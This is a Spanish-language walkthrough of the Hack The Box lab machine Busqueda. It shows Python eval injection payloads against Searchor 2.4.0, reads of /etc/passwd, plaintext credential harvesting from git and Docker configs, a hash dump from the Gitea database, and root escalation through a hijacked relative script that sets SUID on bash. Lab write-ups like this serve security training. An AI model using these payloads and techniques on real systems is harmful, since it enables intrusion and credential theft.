---
title: Busqueda HTB
date: 2023-04-15
published: true
---

# Busqueda HTB Walkthrough

## Reconocimiento

Comenzamos comprobando si la máquina está activa con `ping`, además, en base al ttl podemos pensar que se tratará de una máquina windows. A continuación lanzamos [[nmap]]:

```bash
sudo nmap -p- -sS --min-rate 5000 --open -n -Pn 10.10.11.208
```
```bash
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

A continuación lanzaremos scripts básicos de reconocimiento contra esos puertos:

```bash
nmap -sCV -p22,80 10.10.11.208
```
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que el servicio *http* nos redirige a `http://searcher.htb/`, así que añadimos el dominio al `/etc/hosts`.

También podemos tratar de ver las tecnologías que utiliza la página con [[whatweb]]:

```bash
whatweb http://searcher.htb/
```
```bash
http://searcher.htb/ [200 OK] Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.208], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2]
```

Con wappalizer vemos también que se está utilizando el framework de Python, *flask*.

Sin embargo lo que más llama la atención es la zona de la página que contiene una zona que te permite seleccionar un motor de búsqueda y realizar, como el nombre de la máquina indica, una búsqueda. Podemos ver que esta funcionalidad está hecha con *searchor* en su versión `2.4.0`. Así que nos descargamos el repo de github y analizamos el código.

En el archivo `main.py`, vemos la siguiente línea:

```python
url = eval(
f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
)
```

Podríamos tratar de inyectar código python escapando la función con una secuencia tal que `') codigo_python #`, de forma que quedaría:

```python
url = eval(
f"Engine.{engine}.search('') codigo_python #', copy_url={copy}, open_web={open})"
)
```

La función *eval*, nos permite evaluar expresiones con python (son bloques que devuelven un valor, tales como las llamadas a funciones). Por tanto, podemos tratar de importar *requests* y hacer una petición *http* a nuestra propia máquina (haremos uso de `exec()`, ya que nos permitirá ejecutar sentencias que no devuelvan nada, ya que al terminar su ejecución la propia función devolverá `None`), el payload será `'), exec("import requests; requests.get(ip:port)")#` pasando nuestro puerto e ip:

```bash
sudo python3 -m http.server 80
```
```bash
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.208 - - [16/Apr/2023 17:41:50] "GET / HTTP/1.1" 200 -
```

Recibimos la respuesta, por lo que tenemos ejecución remota de comandos (RCE).

## Explotación

Tras un largo rato tratando de entablar sin éxito una *reverse shell* ([[Reverse shells]]). Podemos, haciendo uso del módulo `subprocess`, tratar de buscar credenciales válidas:

```python
'), exec('import subprocess; subprocess.run(["cat", "/etc/passwd"])')#
```
```bash
[...]
svc:x:1000:1000:svc:/home/svc:/bin/bash
[...]
```

Ya tenemos un usario potencial, por lo podemos ver ya la **flag de usuario**:

```python
'), exec('import subprocess; subprocess.run(["ls", "-a", "/home/svc/user.txt"])')#
```
```
2acdf0cdc9374d5a2dde14d40d61e5d9
```

Si buscamos en la ruta de la aplicación (`/var/www/app`), encontramos un directorio `.git`, con un archivo de configuración `config`:

```bash

[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

Tenemos otras credenciales: `cody:jh1usoih2bkjaspwe92` y además un subdominio: `gitea.searcher.htb`.

Sin embargo la contraseña de `cody` no nos sirve para el ssh, es solo para el subdominio que hemos encontrado. Por otro lado, si probamos la misma contraseña para `svc`, conseguimos entrar!

## Escalada de privilegios

Como siempre, comenzamos con:

```bash
sudo -l
```
```bash
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty
User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Si probamos:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
```
```bash
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Al ejecutar la opción `docker-inspect` con uno de los ejemplos de la [documentación oficial](https://docs.docker.com/engine/reference/commandline/inspect/):

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' mysql_db
```
```json
{"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}
```

Vemos algunas credenciales, `"MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh"`. Además de una base de datos, `gitea`. Podemos tratar de ver la ip del contenedor con:

```bash
/usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' mysql_db
```
```ip
172.19.0.2
```

Y ya podemos conectarnos a [[mysql]]:

```bash
mysql -h 172.19.0.2 -u root -p
```

E introducimos la contraseña del administrador que encontramos antes (`jI86kGUuj87guWr3RyF`). Y estamos dentro:

```mysql
select current_user();
```
```mysql
+----------------+
| current_user() |
+----------------+
| root@%         |
+----------------+
```

Una vez dentro listamos las bases de datos:

```mysql
show databases;
```
```mysql
+--------------------+
| Database           |
+--------------------+
| gitea              |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
```

Seleccionamos primero `gitea`:

```mysql
use gitea;
```

Y vemos las tablas:

```mysql
show tables;
```
```mysql
+---------------------------+
| Tables_in_gitea           |
+---------------------------+
| access                    |
[...]
| upload                    |
| user                      |
| user_badge                |
[...]
```

Nos llama la atención la tabla `user`, si seleccionamos las columnas `name, passwd, passwd_hash_algo`, obtenemos la contraseña hasheada, pero sabemos el algoritmos utilizado:

```mysql
select name,passwd from user;
```
```mysql
+---------------+------------------------------------------------------------------------------------------------------+
| name          | passwd                                                                                               |
+---------------+------------------------------------------------------------------------------------------------------+
| administrator | ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 |
| cody          | b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e |
+---------------+------------------------------------------------------------------------------------------------------+

+---------------+------------------+
| name          | passwd_hash_algo |
+---------------+------------------+
| administrator | pbkdf2           |
| cody          | pbkdf2           |
+---------------+------------------+
```

Esto es un *rabbit hole*, por lo que pasamos a inpeccionar el servicio *gitea*. Si volvemos a ver los servicios que corren en docker, vemos que en el `localhost:3000` corre un servicio:

```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
```
```docker
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS          PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up 52 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up 52 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

Podemos hacer *port forwarding* en nuestra máquina para tratar de acceder:

```bash
ssh svc@ip -L 3000:localhost:3000
```

Si ahora accedemos a la [interfaz web](http://gitea.searcher.htb) de la aplicación, podremos loguearnos como `administrtator`, con una de las contraseñas que encontramos antes (`yuiu1hoiu4i5ho1uh`).

Dentro tendremos acceso a los scripts que podemos ejecutar como root. Destaca el script `system-checkup.py`:

```python
[...]
elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
[...]
```

Podemos ver que al ejecutar el modo `full-checkup`, el script ejecuta el script en [[Bash]] `full-checkup.sh`, pero lo busca en el directorio en el que se ejecute. Por tanto, podríamos crear en `/tmp` un script en bash con el mismo nombre:

```bash
nano full-checkup.sh
```
```bash
#!/bin/bash
chmod +s /bin/bash
```

Con esto daremos privilegios *suid* al binario de bash. Lo ejecutamos yendo a `/tmp` y ejecutandolo mediante:

```bash
cd /tmp
```
```bash
sudo /usr/bin/python3 /opt/scripts/system-checkup.py ful-checkup
```

Así, podremos conseguir una shell privilegiada con:

```bash
bash -p
```

Y tan sólo faltará acceder a `/root/root.txt` (`f493afb90ef4f63d38ce1b6a4e9687bf`). Enhorabuena! Has pwneado la máquina!